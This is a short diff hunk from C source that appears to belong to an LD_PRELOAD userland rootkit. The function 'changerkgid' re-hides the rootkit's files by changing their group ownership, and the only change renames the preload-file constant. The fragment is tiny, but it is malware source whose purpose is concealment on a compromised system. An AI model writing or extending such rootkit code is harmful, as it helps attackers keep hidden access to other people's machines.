@@ -24,7 +24,7 @@ gid_t changerkgid(void){
     // now rehide erythin
     chown_path(GID_PATH, newgid);
     chown_path(INSTALL_DIR, newgid);
-    chown_path(LDSO_PRELOAD, newgid);
+    chown_path(PRELOAD_FILE, newgid);
 #ifdef AUTO_GID_CHANGER
     chown_path(GIDTIME_PATH, newgid);
 #endif
